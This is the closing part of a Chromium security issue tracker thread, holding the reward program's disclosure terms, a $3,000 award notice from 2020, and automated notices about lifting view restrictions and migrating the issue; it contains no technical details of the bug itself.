Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-06-11)

Congrats! The Panel decided to award $3,000 for this report! 

### na...@google.com (2020-06-11)

[Empty comment from Monorail migration]

### [Deleted User] (2020-09-08)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-09-08)

This issue was migrated from crbug.com/chromium/980116?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095552)*
